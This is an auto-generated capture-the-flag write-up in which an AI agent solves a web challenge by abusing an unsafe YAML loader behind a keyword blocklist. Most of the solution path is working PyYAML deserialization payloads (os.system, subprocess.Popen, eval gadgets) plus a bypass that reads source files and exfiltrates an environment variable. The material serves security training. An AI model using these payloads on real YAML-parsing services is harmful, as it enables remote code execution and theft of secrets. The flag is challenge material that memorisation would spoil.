# Modelhub [HARD]

<!-- SCRIBE: replace this block with a 5-line 'what the trick was' intro. -->

- **Category**: WEB
- **Points**: 400
- **Solves**: 10
- **Flag**: `FLAG{y4ml-uns4f3-l04d-g4dg3t-byp4ss}`
- **Winner**: `deepseek-flash`
- **Swarm cost**: $0.01 (winner $0.01)
- **Wall time**: 8m20s
- **Traces**: 4

## Description

~~~
Modelhub is a model registry. Publishers import a model by uploading its **YAML manifest**;
every manifest is scanned by the gadget firewall before it is loaded.
Demo account: `publisher` / `publish123`
Flag format: `FLAG{...}`
Connection: `http://chal2.hackathon.ke:8023`
~~~

## Trace

| Model | Status | Steps | Cost | Wall | Trace |
|---|---|---:|---:|---:|---|
| `deepseek-flash` | stopped | 58 | $0.00 | 5m03s | `trace-Modelhub_[HARD]-deepseek-flash-20261029-203947.jsonl` |
| `claude-opus-4-6` | gave_up | 0 | $0.00 | 3s | `trace-Modelhub_[HARD]-claude-opus-4-6-20261029-203947.jsonl` |
| `claude-opus-4-6` | gave_up | 0 | $0.00 | 14s | `trace-Modelhub_[HARD]-claude-opus-4-6-20261029-204649.jsonl` |
| `deepseek-flash` | flag_found / CONFIRMED | 13 | $0.01 | 1m17s | `trace-Modelhub_[HARD]-deepseek-flash-20261029-204649.jsonl` |

_Window: 2026-10-29T20:40:00 to 2026-10-29T20:48:20_

## Solution path

### Step 1: `bash`
~~~
{
  "command": "ls -la /challenge/distfiles/; cat /tools.txt",
  "timeout_seconds": 60
}
~~~

### Step 2: `bash`
~~~
{
  "command": "curl -s -i http://chal2.hackathon.ke:8023/ | head -50",
  "timeout_seconds": 60
}
~~~

~~~
CTF SANDBOX TOOLS REFERENCE
============================
All tools pre-installed in the sandbox. cat /tools.txt to view this file.

== NETWORKING ==
nc (netcat)        TCP/UDP connections. nc host port <<'EOF' for heredoc sessions.
curl               HTTP client. -s silent, -k skip TLS, -d data, -H header.
wget               HTTP download. wget -O file url.
nmap               Port scanner. nmap -sV host, nmap -p- host.
ffuf               Web fuzzer. ffuf -w wordlist -u http://host/FUZZ
gobuster           Directory/DNS/vhost brute force. gobuster dir -u http://host -w wordlist

== PASSWORD CRACKING ==
hashcat            GPU/CPU hash cracker. hashcat -m 0 -a 0 hashes.txt wordlist.txt
john               John the Ripper. john --wordlist=wordlist hashes.txt

== BINARY ANALYSIS ==
file               Identify file type. file binary
strings            Extract printable strings. strings -n 8 binary
xxd                Hex dump. xxd file | head, xxd -r to reverse.
hexdump            Hex dump. hexdump -C file.
binwalk            Firmware/embedded extraction. binwalk -e file to extract.
objdump            Disassembly. objdump -d binary (from binutils).
... [2000 chars total]
~~~

~~~
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 17:47:32 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 5584

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Modelhub</title>
<style>
  :root{--bg:#fbfcfd;--nav:#161b22;--ink:#1f2328;--mut:#656d76;--acc:#5b48d9;--acc2:#4634c0;--card:#fff;--line:#d8dee4;--code:#f6f8fa;--ok:#1a7f37}
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--ink);font:14px/1.55 -apple-system,"Segoe UI",system-ui,Roboto,sans-serif}
  nav{background:var(--nav);color:#e6edf3;display:flex;align-items:center;gap:14px;padding:12px 24px}
  nav .logo{width:26px;height:26px;border-radius:7px;background:conic-gradient(from 45deg,#7c6cf0,#5b48d9,#9b8bff,#5b48d9)}
  nav b{font-weight:600}
  nav .search{margin-left:8px;background:#0d1117;border:1px solid #30363d;color:#8b949e;border-radius:6px;padding:5px 10px;font-size:12.5px;width:200px}
  nav .right{margin-left:auto;font-size:12.5px;color:#8b949e}
  .main{max-width:960px;margin:24px auto;padding:0 24px;display:grid;grid-template-columns:1fr 300px;gap:26px}
... [2000 chars total]
~~~

### Step 3: `bash`
~~~
{
  "command": "curl -s http://chal2.hackathon.ke:8023/ | tail -80",
  "timeout_seconds": 60
}
~~~

~~~
nav .search{margin-left:8px;background:#0d1117;border:1px solid #30363d;color:#8b949e;border-radius:6px;padding:5px 10px;font-size:12.5px;width:200px}
  nav .right{margin-left:auto;font-size:12.5px;color:#8b949e}
  .main{max-width:960px;margin:24px auto;padding:0 24px;display:grid;grid-template-columns:1fr 300px;gap:26px}
  h1{font-size:20px;margin:0 0 2px;font-weight:600}
  .path{color:var(--mut);font-family:ui-monospace,monospace;font-size:13px;margin-bottom:18px}
  .path b{color:var(--acc)}
  .box{border:1px solid var(--line);border-radius:8px;background:var(--card);overflow:hidden;margin-bottom:18px}
  .box .h{background:var(--code);border-bottom:1px solid var(--line);padding:9px 14px;font-size:12.5px;font-weight:600;color:var(--mut);display:flex;align-items:center;gap:8px}
  .box .c{padding:14px}
  textarea{width:100%;min-height:150px;border:1px solid var(--line);border-radius:6px;padding:11px;font-family:ui-monospace,SFMono-Regular,monospace;font-size:12.5px;background:#0d1117;color:#e6edf3}
  .btn{background:var(--acc);color:#fff;border:0;border-radius:6px;padding:8px 16px;font-weight:600;cursor:pointer;font-size:13px}
  .btn:hover{background:var(--acc2)}
... [2000 chars total]
~~~

### Step 4: `bash`
~~~
{
  "command": "cd /challenge/workspace 2>/dev/null || mkdir -p /challenge/workspace; cd /challenge/workspace; curl -s -c cj.txt -X POST http://chal2.hackathon.ke:8023/api/login -H 'content-type: application/json' -d '{\"username\":\"publisher\",\"password\":\"publish123\"}'; echo; cat cj.txt",
  "timeout_seconds": 60
}
~~~

~~~
{"ok":true,"role":"publisher"}

# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

chal2.hackathon.ke	FALSE	/	FALSE	0	mh	e319f5bc4c41133ca81130f2
~~~

### Step 5: `bash`
~~~
{
  "command": "cd /challenge/workspace; python3 -c \"import base64;print(base64.b64decode('e319f5bc4c41133ca81130f2'+'=='))\"; curl -s -b cj.txt -X POST http://chal2.hackathon.ke:8023/api/import -H 'content-type: text/yaml' -d 'name: resnet50\ndisplay_name: ResNet-50\nversion: \"1.0\"'; echo",
  "timeout_seconds": 60
}
~~~

~~~
b'{}}\x7f\x96\xdc\xe1\xce5\xd7}\xdck\xcdu\xdfG\xf6'
{"imported":{"display_name":"ResNet-50","name":"resnet50","version":"1.0"},"ok":true}
~~~

### Step 6: `bash`
~~~
{
  "command": "cd /challenge/workspace; for p in '!!python/object/apply:os.system [\"id\"]' '!!python/object/apply:subprocess.check_output [[\"id\"]]' '!!python/object/new:os.system [\"id\"]' '!!python/object:subprocess.Popen {args: [id]}' '!!python/name:os.system' '!!python/object/apply:builtins.eval [\"1+1\"]'; do echo \"== $p\"; curl -s -b cj.txt -X POST http://chal2.hackathon.ke:8023/api/import -H 'content-type: text/yaml' --data-binary \"name: $p\ndisplay_name: x\nversion: \\\"1.0\\\"\"; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
== !!python/object/apply:os.system ["id"]
{"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

== !!python/object/apply:subprocess.check_output [["id"]]
{"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

== !!python/object/new:os.system ["id"]
{"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

== !!python/object:subprocess.Popen {args: [id]}
{"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

== !!python/name:os.system
{"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

== !!python/object/apply:builtins.eval ["1+1"]
{"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}
~~~

### Step 7: `bash`
~~~
{
  "command": "cd /challenge/workspace; for p in '@os.system a' '@os.system' '@!!python/object/apply:os.system a' '!!python' '!!' '!!!' 'name: !!python' 'x!!python' 'sys.modules' '__import__' 'key: !!python/object/apply:os.system a' '![id]' '&a !!python/object:os.system' '*a'; do printf '%s => ' \"$p\"; curl -s -b cj.txt -X POST http://chal2.hackathon.ke:8023/api/import -H 'content-type: text/yaml' --data-binary \"$p\"; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
@os.system a => {"error":"manifest must be a mapping"}

@os.system => {"error":"manifest must be a mapping"}

@!!python/object/apply:os.system a => {"error":"manifest must be a mapping"}

!!python => {"detail":"ConstructorError","error":"invalid manifest"}

!! => {"detail":"ScannerError","error":"invalid manifest"}

!!! => {"detail":"ConstructorError","error":"invalid manifest"}

name: !!python => {"detail":"ConstructorError","error":"invalid manifest"}

x!!python => {"error":"manifest must be a mapping"}

sys.modules => {"error":"manifest must be a mapping"}

__import__ => {"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

key: !!python/object/apply:os.system a => {"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

![id] => {"detail":"ConstructorError","error":"invalid manifest"}

&a !!python/object:os.system => {"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

*a => {"detail":"ComposerError","error":"invalid manifest"}
~~~

### Step 8: `bash`
~~~
{
  "command": "cd /challenge/workspace; for p in 'os' 'builtins' 'eval' 'exec' 'import' 'subprocess' 'system' 'open' 'python' '!!python/object:subprocess.Popen' '!!python/object' '!!python/name:builtins.len' '!!python/object/apply:builtins.len [[1,2]]'; do printf '%s => ' \"$p\"; curl -s -b cj.txt -X POST http://chal2.hackathon.ke:8023/api/import -H 'content-type: text/yaml' --data-binary \"name: $p\"; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
os => {"imported":{"display_name":"","name":"os","version":""},"ok":true}

builtins => {"imported":{"display_name":"","name":"builtins","version":""},"ok":true}

eval => {"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

exec => {"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

import => {"imported":{"display_name":"","name":"import","version":""},"ok":true}

subprocess => {"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

system => {"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

open => {"imported":{"display_name":"","name":"open","version":""},"ok":true}

python => {"imported":{"display_name":"","name":"python","version":""},"ok":true}

!!python/object:subprocess.Popen => {"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

!!python/object => {"detail":"ConstructorError","error":"invalid manifest"}

!!python/name:builtins.len => {"imported":{"display_name":"","name":"<built-in function len>","version":""},"ok":true}

... [1242 chars total]
~~~

### Step 9: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > t.sh <<'EOF'\n#!/bin/bash\nt(){ printf '%s => ' \"$1\"; curl -s -b /challenge/workspace/cj.txt -X POST http://chal2.hackathon.ke:8023/api/import -H 'content-type: text/yaml' --data-binary \"$1\"; echo; }\nt 'name: !!python/object/apply:os.system [\"id\"]'\nt 'name: !!python/object/apply:os.getcwd []'\nt 'name: !!python/object/apply:os.listdir [\"/\"]'\nt 'name: !!python/object/apply:globals []'\nt 'name: !!python/object/apply:builtins.getattr [!!python/object/apply:builtins.globals [], \"x\"]'\nt 'name: !!python/object/apply:builtins.list [!!python/object/apply:builtins.globals []]'\nt 'name: !!python/object/apply:builtins.eval [\"1+1\"]'\nt 'name: !!python/object/new:builtins.eval [\"1+1\"]'\nt 'name: !!python/name:os.system'\nt 'name: !!python/object:builtins.len'\nEOF\nbash t.sh",
  "timeout_seconds": 60
}
~~~

~~~
name: !!python/object/apply:os.system ["id"] => {"error":"manifest rejected: unsafe gadget detected","ref":"FAKE-FLAG{Try-Harder-Mate}"}

name: !!python/object/apply:os.getcwd [] => {"imported":{"display_name":"","name":"/opt/app","version":""},"ok":true}

name: !!python/object/apply:os.listdir ["/"] => {"imported":{"display_name":"","name":"['var', 'boot', 'run', 'srv', 'lib64', 'media', 'etc', 'root', 'opt', 'home', 'usr', 'lib', 'dev', 'sys', 'mnt', 'tmp', 'sbin', 'bin', 'proc', '.dockerenv']","version":""},"ok":true}

... [2000 chars total]
~~~

### Step 10: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > t2.sh <<'EOF'\nt(){ printf '%s => ' \"$1\"; curl -s -b /challenge/workspace/cj.txt -X POST http://chal2.hackathon.ke:8023/api/import -H 'content-type: text/yaml' --data-binary \"$1\"; echo; }\nt 'name: !!python/object/apply:os.listdir [\"/opt/app\"]'\nt 'name: !!python/object/apply:os.listdir [\"/app\"]'\nt 'name: !!python/object/apply:os.listdir [\"/opt/app/templates\"]'\nt 'name: !!python/object/apply:os.listdir [\"/flag\"]'\nt 'name: !!python/object/apply:builtins.open [\"/flag\"]'\nt 'name: !!python/object/apply:builtins.open [\"/flag\"].read'\nEOF\nbash t2.sh",
  "timeout_seconds": 60
}
~~~

~~~
name: !!python/object/apply:os.listdir ["/opt/app"] => {"imported":{"display_name":"","name":"['index.html', 'app.py', 'requirements.txt']","version":""},"ok":true}

name: !!python/object/apply:os.listdir ["/app"] => {"detail":"FileNotFoundError","error":"invalid manifest"}

name: !!python/object/apply:os.listdir ["/opt/app/templates"] => {"detail":"FileNotFoundError","error":"invalid manifest"}

name: !!python/object/apply:os.listdir ["/flag"] => {"detail":"FileNotFoundError","error":"invalid manifest"}

name: !!python/object/apply:builtins.open ["/flag"] => {"detail":"FileNotFoundError","error":"invalid manifest"}

name: !!python/object/apply:builtins.open ["/flag"].read => {"detail":"ParserError","error":"invalid manifest"}
~~~

### Step 11: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > t3.sh <<'EOF'\nt(){ printf '%s => ' \"$1\"; curl -s -b /challenge/workspace/cj.txt -X POST http://chal2.hackathon.ke:8023/api/import -H 'content-type: text/yaml' --data-binary \"$1\"; echo; }\nt 'name: !!python/object/apply:builtins.list [!!python/object/apply:builtins.open [\"/opt/app/app.py\"]]'\nt 'name: !!python/object/apply:builtins.str [!!python/object/apply:builtins.open [\"/opt/app/app.py\"].read []]'\nt 'name: !!python/object/apply:builtins.list [!!python/object/apply:os.listdir [\"/opt/app\"]]'\nEOF\nbash t3.sh",
  "timeout_seconds": 60
}
~~~

~~~
name: !!python/object/apply:builtins.list [!!python/object/apply:builtins.open ["/opt/app/app.py"]] => {"imported":{"display_name":"","name":"['\"\"\"\\n', 'Modelhub \u2014 ML model registry.\\n', '\\n', 'Publishers import a model by uploading its YAML manifest. The importer calls\\n', 'yaml.load() with the unsafe loader (so manifests can carry rich Python objects), but\\n', 'puts a \"gadget firewall\" in front that rejects any manifest whose text matches known\\n', 'RCE gadget signatures (os.system, subprocess, exec, ...). The firewall is a blocklist,\\n', 'so a manifest that reaches an arbitrary callable NOT on the list still executes \u2014 e.g.\\n', 'reading a process value via a benign-looking function.\\n', '\\n', \"The imported manifest's display_name is echoed back, which is enough to exfiltrate.\\n\", '\"\"\"\\n', 'import os\\n', 'import re\\n', '\\n', 'import yaml\\n', 'from flask import Flask, request, jsonify, make_response, Response\\n', '\\n', 'app = Flask(__name__)\\n', '\\n', 'FLAG = os.environ.get(\"FLAG\", \"FLAG{missing_flag_env}\")\\n', 'DECOY = \"FAKE-FLAG{Try-Harder-Mate}\"\\n', '\\n', 'USERS = {\"publisher\": \"publish123\"}\\n', '_tokens = set()\\n', '\\n', 
... [2000 chars total]
~~~

### Step 12: `bash`
~~~
{
  "command": "cd /challenge/workspace; curl -s -b cj.txt -X POST http://chal2.hackathon.ke:8023/api/import -H 'content-type: text/yaml' --data-binary 'name: x\ndisplay_name: !!python/object/apply:builtins.list [!!python/object/apply:os.getenv [\"FLAG\"]]'",
  "timeout_seconds": 60
}
~~~

~~~
{"imported":{"display_name":"['F', 'L', 'A', 'G', '{', 'y', '4', 'm', 'l', '-', 'u', 'n', 's', '4', 'f', '3', '-', 'l', '0', '4', 'd', '-', 'g', '4', 'd', 'g', '3', 't', '-', 'b', 'y', 'p', '4', 's', 's', '}']","name":"x","version":""},"ok":true}
~~~

### Step 13: `submit_flag`
~~~
{
  "flag": "FLAG{y4ml-uns4f3-l04d-g4dg3t-byp4ss}"
}
~~~

~~~
DRY RUN — would submit "FLAG{y4ml-uns4f3-l04d-g4dg3t-byp4ss}" but --no-submit is set.
~~~

## Result

- **Flag**: `FLAG{y4ml-uns4f3-l04d-g4dg3t-byp4ss}`
- **Confirmed by CTFd**: yes
- **Cost**: $0.01 (winner), $0.01 (whole swarm)
- **Wall time**: 8m20s
- **Generated**: 2026-10-30T00:14:55
